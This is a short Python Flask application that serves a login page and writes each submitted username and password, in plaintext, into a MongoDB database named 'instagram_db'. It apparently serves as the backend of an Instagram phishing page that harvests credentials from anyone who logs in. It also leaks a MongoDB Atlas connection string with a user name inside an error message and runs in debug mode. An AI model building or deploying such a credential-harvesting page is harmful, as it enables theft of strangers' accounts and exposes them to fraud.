from flask import Flask, render_template, request
from pymongo import MongoClient
import os

app = Flask(__name__)

# -----------------------------
# CONNECT TO MONGO ATLAS
# -----------------------------
# This reads the MONGO_URI from Render environment variables
mongo_uri = os.environ.get("MONGO_URI")

# If the variable is missing, avoid app crash
if not mongo_uri:
    raise ValueError("mongodb+srv://danish:<db_password>@cluster0.wiieqp8.mongodb.net/?appName=Cluster0")

client = MongoClient(mongo_uri)

# DATABASE & COLLECTION
db = client["instagram_db"]       # Database name you created
users = db["users"]               # Collection name you created

# -----------------------------
# ROUTES
# -----------------------------
@app.route("/")
def login_page():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    # Store user login into MongoDB
    users.insert_one({
        "username": username,
        "password": password
    })

    return "✔ Login Data Saved Successfully!"


# -----------------------------
# MAIN
# -----------------------------
if __name__ == "__main__":
    app.run(debug=True)
